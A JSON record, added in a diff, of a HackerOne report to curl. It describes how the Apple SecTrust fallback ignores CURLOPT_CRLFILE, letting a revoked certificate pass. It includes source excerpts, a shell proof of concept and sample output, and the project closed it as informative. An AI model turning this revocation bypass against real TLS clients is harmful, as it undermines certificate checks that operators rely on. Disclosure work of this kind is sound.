@@ -1,0 +1,109 @@
+{
+  "id": 3993850,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTkzODUw",
+  "url": "https://hackerone.com/reports/3993850",
+  "title": "Apple SecTrust fallback ignores CURLOPT_CRLFILE, letting a revoked cert pass",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "low",
+  "readable_substate": "Informative",
+  "created_at": "2026-09-03T15:27:02.287Z",
+  "submitted_at": "2026-09-03T15:27:02.621Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "giant_anteater",
+    "url": "/giant_anteater",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/r9sgcvqgyzx7oyd4vqjv580xuk4y/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-09-08T06:14:44.082Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-09-05T20:55:12.135Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "When libcurl is built with `USE_APPLE_SECTRUST` and the native (Apple) trust store is in use, a certificate that OpenSSL/GnuTLS rejects because it is on the operator's `CURLOPT_CRLFILE` list is re-checked by Apple's `SecTrust` API instead, and `SecTrust` is never told about that CRL file at all.\n\n## The bug\n\n`CURLOPT_CRLFILE` is loaded into OpenSSL's `X509_STORE` and revocation checking is turned on for it:\n\n```c\n// lib/vtls/openssl.c:3108-3118\nif(ssl_crlfile) {\n  /* tell OpenSSL where to find CRL file that is used to check certificate\n   * revocation */\n  lookup = X509_STORE_add_lookup(store, X509_LOOKUP_file());\n  if(!lookup ||\n     (!X509_load_crl_file(lookup, ssl_crlfile, X509_FILETYPE_PEM))) {\n    failf(data, \"error loading CRL file: %s\", ssl_crlfile);\n    return CURLE_SSL_CRL_BADFILE;\n  }\n  x509flags = X509_V_FLAG_CRL_CHECK | X509_V_FLAG_CRL_CHECK_ALL;\n  infof(data, \" CRLfile: %s\", ssl_crlfile);\n}\n```\n\nBut `CURLOPT_CRLFILE` has no effect on `native_ca_store` — only a custom CA path/file/blob does:\n\n```c\n// lib/vtls/vtls_config.c:258-261\n#if defined(USE_APPLE_SECTRUST) || defined(CURL_CA_NATIVE)\n    if(!sslc->custom_capath && !sslc->custom_cafile && !sslc->custom_cablob)\n      sslc->primary.native_ca_store = TRUE;\n#endif\n```\n\nSo an app that sets only `CURLOPT_CRLFILE` (no custom CA) keeps `native_ca_store == TRUE`, the default on Apple builds. Whenever OpenSSL's verification fails for any reason — including `X509_V_ERR_CERT_REVOKED`/CRL rejection — the code unconditionally falls back to Apple `SecTrust`:\n\n```c\n// lib/vtls/openssl.c:4813\nif(!verified && conn_config->verifypeer && conn_config->native_ca_store) {\n  /* we verify using Apple SecTrust *unless* OpenSSL already verified.\n   * This may happen if the application intercepted the OpenSSL callback\n   * and installed its own. */\n  result = ossl_apple_verify(cf, data, octx, peer);\n```\n\n`ossl_apple_verify` calls `Curl_vtls_apple_verify`, which builds a `SecTrustRef` from the peer's chain and a revocation policy driven only by `ssl_config->no_revoke` — never `conn_config->CRLfile`:\n\n```c\n// lib/vtls/apple.c:131\nif(!ssl_config->no_revoke) {\n  if(__builtin_available(macOS 10.9, iOS 7, tvOS 9, watchOS 2, *)) {\n    CFOptionFlags revocation_flags = kSecRevocationUseAnyAvailableMethod;\n    ...\n    policy = SecPolicyCreateRevocation(revocation_flags);\n```\n\n```c\n// lib/vtls/apple.c:234\nresult = SecTrustEvaluateWithError(trust, &error) ?\n         CURLE_OK : CURLE_PEER_FAILED_VERIFICATION;\n```\n\n`CRLfile` (or anything derived from it) does not appear anywhere in `apple.c`. If a certificate is on the operator's private CRL but `trustd`'s own revocation data doesn't independently know about it (private/internal PKI, propagation lag, offline check), `SecTrustEvaluateWithError` returns success, `sectrust_verified` is set, and the connection proceeds — silently overriding the CRL rejection the operator explicitly asked for.\n\nThe same pattern exists in the GnuTLS backend (`lib/vtls/gtls.c:1607`, `if(!verified && config->native_ca_store)` calling `Curl_vtls_apple_verify` with no `CRLfile` check either), so this isn't OpenSSL-specific.\n\n## PoC\n\n```\n#!/bin/sh\n# PoC: curl's Apple SecTrust fallback ignores CURLOPT_CRLFILE.\n#\n# When curl is built with USE_APPLE_SECTRUST and the native (system) CA store\n# is in use (the default whenever no custom --cacert/--capath is given), a\n# certificate that OpenSSL rejects for ANY reason -- including because it's\n# on the operator's CURLOPT_CRLFILE list -- gets silently re-checked by\n# Apple's SecTrustEvaluateWithError instead. SecTrust performs its own,\n# independent revocation checking and is never told about the CRL file, so\n# a certificate the operator explicitly revoked is accepted anyway.\n#\n# This script builds a minimal curl with USE_APPLE_SECTRUST, issues a\n# throwaway CA + leaf cert, revokes the leaf via a CRL, serves it over TLS\n# on localhost, and shows that `curl --crlfile revoked.crl` connects\n# successfully despite the revocation.\n#\n# Requires: macOS with Xcode CLT, cmake, and an OpenSSL dev install\n# (e.g. `brew install openssl@3`). Run as your normal user -- no sudo.\n#\n# Safe to re-run: everything happens in a throwaway work dir, the test CA\n# is removed from your keychain in the cleanup trap, and the whole thing\n# is a no-op on any system it can't build/run on.\nset -eu\n\nWORK=\"$(mktemp -d /tmp/apple-sectrust-poc.XXXXXX)\"\nPORT=\"${PORT:-8443}\"\nCURL_SRC=\"${CURL_SRC:-}\"\nOPENSSL_BIN=\"$(command -v openssl || true)\"\nfor p in /opt/homebrew/opt/openssl@3 /usr/local/opt/openssl@3; do\n  [ -x \"$p/bin/openssl\" ] && OPENSSL_BIN=\"$p/bin/openssl\" && OPENSSL_PREFIX=\"$p\"\ndone\n: \"${OPENSSL_PREFIX:?set OPENSSL_PREFIX to your OpenSSL install (e.g. \\$(brew --prefix openssl@3))}\"\n\nSERVER_PID=\"\"\ncleanup() {\n  [ -n \"$SERVER_PID\" ] && kill \"$SERVER_PID\" 2>/dev/null || true\n  security remove-trusted-cert \"$WORK/ca.pem\" 2>/dev/null || true\n  security delete-certificate -c \"VF PoC Test Root CA\" login.keychain-db 2>/dev/null || true\n}\ntrap cleanup EXIT INT TERM\n\necho \"== work dir: $WORK ==\"\n\n# --- 1. get + build a curl with USE_APPLE_SECTRUST -------------------------\nif [ -z \"$CURL_SRC\" ]; then\n  echo \"== cloning curl ==\"\n  git clone --depth 1 https://github.com/curl/curl.git \"$WORK/curl-src\"\n  CURL_SRC=\"$WORK/curl-src\"\nfi\n\necho \"== configuring + building curl (USE_APPLE_SECTRUST=ON) ==\"\ncmake -S \"$CURL_SRC\" -B \"$WORK/build\" \\\n  -DCMAKE_BUILD_TYPE=Release -DBUILD_SHARED_LIBS=ON \\\n  -DCURL_USE_OPENSSL=ON -DOPENSSL_ROOT_DIR=\"$OPENSSL_PREFIX\" \\\n  -DUSE_APPLE_SECTRUST=ON -DBUILD_TESTING=OFF \\\n  -DCMAKE_INSTALL_PREFIX=\"$WORK/install\" >\"$WORK/cmake.log\" 2>&1\ngrep -q AppleSecTrust \"$WORK/cmake.log\" || { echo \"FAIL: AppleSecTrust not enabled, see $WORK/cmake.log\"; exit 1; }\ncmake --build \"$WORK/build\" --target curl -j 8 >\"$WORK/build.log\" 2>&1\nCURL_BIN=\"$WORK/build/src/curl\"\nexport DYLD_LIBRARY_PATH=\"$WORK/build/lib\"\n\n# --- 2. throwaway CA + a leaf cert for localhost, then revoke the leaf -----\necho \"== generating throwaway CA + revoked leaf cert ==\"\ncd \"$WORK\"\n\"$OPENSSL_BIN\" genrsa -out ca.key 2048 2>/dev/null\n\"$OPENSSL_BIN\" req -x509 -new -key ca.key -days 3650 -out ca.pem \\\n  -subj \"/CN=VF PoC Test Root CA\" \\\n  -addext \"basicConstraints=critical,CA:TRUE\" \\\n  -addext \"keyUsage=critical,keyCertSign,cRLSign\"\n\n\"$OPENSSL_BIN\" genrsa -out leaf.key 2048 2>/dev/null\n\"$OPENSSL_BIN\" req -new -key leaf.key -out leaf.csr -subj \"/CN=localhost\"\n\ntouch index.txt; echo 1000 >serial; echo 01 >crlnumber\ncat >ca_db.cnf <<EOF\n[ca]\ndefault_ca = myca\n[myca]\ndir = $WORK\ndatabase = \\$dir/index.txt\nnew_certs_dir = \\$dir\ncertificate = \\$dir/ca.pem\nprivate_key = \\$dir/ca.key\nserial = \\$dir/serial\ncrlnumber = \\$dir/crlnumber\ndefault_md = sha256\ndefault_days = 90\ndefault_crl_days = 30\npolicy = policy_any\ncopy_extensions = none\n[policy_any]\ncommonName = supplied\nEOF\n# validity <= 398 days and SAN/AKI/SKI are required or Apple SecTrust\n# rejects the cert as \"not standards compliant\" before the bug is even reached\ncat >leaf_ext.cnf <<EOF\nbasicConstraints = CA:FALSE\nkeyUsage = digitalSignature,keyEncipherment\nextendedKeyUsage = serverAuth\nsubjectAltName = DNS:localhost,IP:127.0.0.1\nauthorityKeyIdentifier = keyid:always\nsubjectKeyIdentifier = hash\nEOF\n\"$OPENSSL_BIN\" ca -batch -config ca_db.cnf -days 90 -in leaf.csr -out leaf.pem \\\n  -extfile leaf_ext.cnf >\"$WORK/ca-issue.log\" 2>&1\n\"$OPENSSL_BIN\" ca -batch -config ca_db.cnf -revoke leaf.pem >\"$WORK/ca-revoke.log\" 2>&1\n\"$OPENSSL_BIN\" ca -batch -config ca_db.cnf -gencrl -out revoked.crl >\"$WORK/ca-crl.log\" 2>&1\ncat leaf.pem ca.pem >leaf_chain.pem\n\necho \"== leaf serial (must match the CRL entry below) ==\"\n\"$OPENSSL_BIN\" x509 -in leaf.pem -noout -serial\n\"$OPENSSL_BIN\" crl -in revoked.crl -noout -text | grep -A1 \"Revoked Certificates\"\n\n# --- 3. trust the throwaway CA, as a real deployed corporate/MDM root would -\necho \"== adding throwaway CA to this user's trust settings (removed on exit) ==\"\nsecurity add-trusted-cert -r trustRoot -k login.keychain-db ca.pem\n\n# --- 4. serve the revoked cert over TLS on localhost ------------------------\n\"$OPENSSL_BIN\" s_server -accept \"$PORT\" -cert leaf_chain.pem -key leaf.key -www \\\n  >\"$WORK/s_server.log\" 2>&1 &\nSERVER_PID=$!\nsleep 1\n\n# --- 5. the actual test: does curl honor --crlfile? -------------------------\necho\necho \"== running curl against the revoked cert, with --crlfile set ==\"\necho \"   (expected secure behavior: REJECTED; actual: see below)\"\necho\nset +e\n\"$CURL_BIN\" -sS -v --crlfile revoked.crl \"https://localhost:$PORT/\" >\"$WORK/result.log\" 2>&1\nRC=$?\nset -e\n\ngrep -E \"SSL Trust Anchors|Native:|CRLfile:|OpenSSL verify result|SSL certificate verified|verify result|^< HTTP\" \"$WORK/result.log\" || true\necho\nif [ \"$RC\" -eq 0 ]; then\n  echo \"BUG CONFIRMED: curl (exit 0) connected successfully to a certificate\"\n  echo \"explicitly listed as revoked in --crlfile. Apple SecTrust fallback\"\n  echo \"silently overrode the CRL check.\"\nelse\n  echo \"curl exited $RC (rejected) -- bug not reproduced on this build/OS.\"\nfi\necho\necho \"full transcript: $WORK/result.log\"\n```\n\nThe PoC clones&builds curl with USE_APPLE_SECTRUST, mints a throwaway CA + a revoked leaf cert + a CRL naming it, trusts the CA the way a real MDM-deployed corporate root would be, serves the revoked cert over local TLS, then runs `curl --crlfile revoked.crl https://localhost:PORT/` and checks the exit code.\n\n```\n  * SSL Trust Anchors:\n  *   Native: Apple SecTrust\n  *  CRLfile: revoked.crl\n  * OpenSSL verify result: 14\n  * SSL certificate verified via Apple SecTrust.\n  < HTTP/1.0 200 ok\n  ```\n\nSo despite it being revoked, the connection still succeeds.\n\n## Where it came from\n\nThe fallback originally only triggered on one specific OpenSSL error code, which excluded CRL rejections:\n\n```c\n// as introduced, lib/vtls/openssl.c (eefd03c5)\nif(!verified &&\n   conn_config->verifypeer && ssl_config->native_ca_store &&\n   (ossl_verify == X509_V_ERR_UNABLE_TO_GET_ISSUER_CERT_LOCALLY)) {\n```\n\nThat restriction was removed in [`6aa8fa3fdfdb1a0d4d022cc04e478f13e2b6b880`](https://github.com/curl/curl/commit/6aa8fa3fdfdb1a0d4d022cc04e478f13e2b6b880) — \"apple-sectrust: always ask when `native_ca_store` is in use\" (2025-11-21), which widened the OpenSSL and GnuTLS fallbacks to fire on *any* verification failure:\n\n> When OpenSSL fails to verify the peer certificate, we checked for one specific reason code and did not ask Apple SecTrust for any other failure. Always ask Apple SecTrust after OpenSSL fails when the `native_ca_store` is enabled. If the user configures a CAfile or CApath, the native store is disabled, so this does not affect use cases where users asks curl to use a specific set of trust anchors.\n\nThat reasoning covers `CAfile`/`CApath` but never considers `CRLfile` — a separate revocation input, not a trust anchor — so removing the error-code check silently pulled CRL-based rejections into the same catch-all fallback. The bug is about 9.5 months old and is still present at current `main` ([`38703fe2`](https://github.com/curl/curl/commit/38703fe2610bf6e79390bfc93a8558ffc0e2b02c), 2026-09-02).\n\n## Suggested direction\n\nSkip the Apple SecTrust fallback (or make it fail closed) when `conn_config->CRLfile` is set — `CURLOPT_CRLFILE` is a request for a revocation check that `SecTrust` doesn't perform, so falling back there defeats the option's purpose. At minimum, restore the narrower error-code condition for the CRL-check case specifically.\n\nCheers,\nJosh\n\n## Impact\n\nAny TLS server the client connects to can present a certificate that the operator has explicitly revoked via `CURLOPT_CRLFILE`, and still complete the handshake, as long as libcurl was built with `USE_APPLE_SECTRUST`, no custom CA option is set (native store stays default-on), and Apple's own revocation checking doesn't flag the same cert. This defeats a revocation control the caller went out of their way to configure — the whole point of `CURLOPT_CRLFILE` is to reject certs the built-in trust/revocation logic wouldn't otherwise catch.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 1,
+  "voters": [
+    "bugsatti"
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
